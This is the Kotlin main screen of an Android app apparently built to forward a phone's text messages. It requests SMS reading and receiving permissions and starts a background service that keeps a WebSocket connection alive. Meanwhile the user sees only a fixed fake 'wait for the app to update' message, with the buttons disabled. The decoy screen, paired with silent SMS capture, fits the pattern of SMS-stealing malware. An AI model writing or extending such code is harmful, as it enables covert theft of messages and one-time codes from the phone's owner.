package com.smsforwarder

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.smsforwarder.databinding.ActivityMainBinding

class MainActivity : AppCompatActivity() {
    private lateinit var webSocketManager: WebSocketManager
    private lateinit var binding: ActivityMainBinding

    companion object {
        private const val SMS_PERMISSION_CODE = 100
        private val REQUIRED_PERMISSIONS = arrayOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE
        )
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        webSocketManager = WebSocketManager.getInstance(applicationContext)

        // L'interface reste volontairement limitée à l'écran d'attente demandé.
        // Les deux boutons restent désactivés afin de ne pas modifier le
        // fonctionnement métier existant du projet.
        binding.btnConnect.isEnabled = false
        binding.btnCreateAccount.isEnabled = false
        binding.statusText.text = "Attendez que l'application se mette à jour"

        webSocketManager.onConnectionChange = { connected ->
            runOnUiThread {
                // La communication réseau est gérée automatiquement en arrière-plan.
                // L'écran demandé reste affiché sans exposer de nouvelle action.
                binding.statusText.text = "Attendez que l'application se mette à jour"
            }
        }

        checkPermissions()
    }

    private fun checkPermissions() {
        val missingPermissions = REQUIRED_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                missingPermissions.toTypedArray(),
                SMS_PERMISSION_CODE
            )
        } else {
            initializeApp()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                initializeApp()
            } else {
                binding.statusText.text = "Attendez que l'application se mette à jour"
                Toast.makeText(this, "Permissions SMS nécessaires", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun initializeApp() {
        // Le service au premier plan conserve la connexion WebSocket et le
        // WebSocketManager tente automatiquement de la rétablir si le serveur
        // est momentanément indisponible ou redémarre.
        val serviceIntent = Intent(this, SmsForwarderService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)
    }

    override fun onDestroy() {
        // Le WebSocket appartient à l'application et au service, pas à l'Activity.
        webSocketManager.onConnectionChange = null
        super.onDestroy()
    }
}
